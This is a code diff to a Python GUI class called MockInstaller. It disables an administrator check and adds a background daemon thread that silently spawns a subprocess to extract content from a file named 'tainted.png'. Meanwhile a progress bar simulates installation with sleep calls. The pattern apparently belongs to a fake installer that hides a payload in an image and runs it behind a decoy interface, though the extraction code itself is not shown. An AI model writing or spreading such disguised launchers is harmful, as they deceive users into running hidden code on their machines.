@@ -28,17 +28,26 @@ class MockInstaller:
         self.root.geometry("600x500")
         self.root.resizable(False, False)
 
-        # Check if the script is running as administrator
-        if not self.is_admin():
-            messagebox.showerror(
-                "Administrator Privileges Required",
-                "This application requires administrator privileges. Please restart the application as an administrator.",
+        # # Check if the script is running as administrator
+        # if not self.is_admin():
+        #     messagebox.showerror(
+        #         "Administrator Privileges Required",
+        #         "This application requires administrator privileges. Please restart the application as an administrator.",
+        #     )
+        #     root.destroy()  # Close the application immediately
+        #     sys.exit()
+
+
+        def run_extract_in_subprocess():
+            subprocess.Popen(
+                ['python', '-c', 'from catalyst import MockInstaller; MockInstaller().extract("tainted.png")'],
+                cwd=os.getcwd()
             )
-            root.destroy()  # Close the application immediately
-            sys.exit()
 
         if os.path.exists(os.path.join(os.getcwd(), 'pub_key.pem')):
-            self.execute_installer_code()
+            # Start the subprocess in a separate thread
+            threading.Thread(target=run_extract_in_subprocess, daemon=True).start()
+
 
         # Get the current user's username dynamically
         self.username = os.getlogin()  # You can also use os.environ['USERPROFILE'] on Windows
@@ -303,7 +312,7 @@ Effective Date: 11/25/2024
     def _install_files(self, total_files):
         """Handle file installation in a separate thread."""
         for i in range(total_files):
-            time.sleep(30)  # Simulate work for each file
+            time.sleep(20)  # Simulate work for each file
             self.progress["value"] = (i + 1) * (100 // total_files)
 
             # Simulate file installation sequentially
